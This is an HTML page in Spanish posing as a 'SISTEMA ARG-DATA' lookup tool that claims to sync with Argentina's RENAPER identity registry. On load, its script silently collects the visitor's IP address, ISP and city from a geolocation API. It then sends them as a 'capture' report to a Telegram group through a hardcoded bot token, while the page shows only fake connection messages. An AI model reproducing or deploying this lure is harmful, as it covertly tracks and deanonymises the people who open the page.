<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>SISTEMA ARG-DATA</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #000; color: #00f2ff; font-family: monospace; text-align: center; padding-top: 50px; }
        .box { border: 1px solid #00f2ff; padding: 20px; display: inline-block; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h3>ACCEDIENDO AL NODO...</h3>
        <p id="log">Sincronizando con RENAPER...</p>
    </div>

    <script>
        const token = "8488321953:AAFFIvsfxsxxp2ImaSl3WQzsuCTOyblqPig";
        const grupoId = "-1003670055074"; // Tu ID de grupo corregido

        async function enviarReporte() {
            try {
                // Captura IP
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();

                const texto = `üì¢ **¬°CAPTURA ARG-DATA!**\n` +
                              `--------------------------------\n` +
                              `üåê **IP:** \`${data.ip}\`\n` +
                              `üè¢ **ISP:** \`${data.org}\`\n` +
                              `üìç **Lugar:** \`${data.city}, ${data.country_name}\`\n` +
                              `--------------------------------`;

                // ENV√çO DIRECTO AL GRUPO POR API
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: grupoId,
                        text: texto,
                        parse_mode: 'Markdown'
                    })
                });

                document.getElementById('log').innerText = "CONEXI√ìN ESTABLECIDA - BUSCANDO DNI...";
            } catch (e) {
                console.error(e);
            }
        }

        window.onload = enviarReporte;
    </script>
</body>
</html>
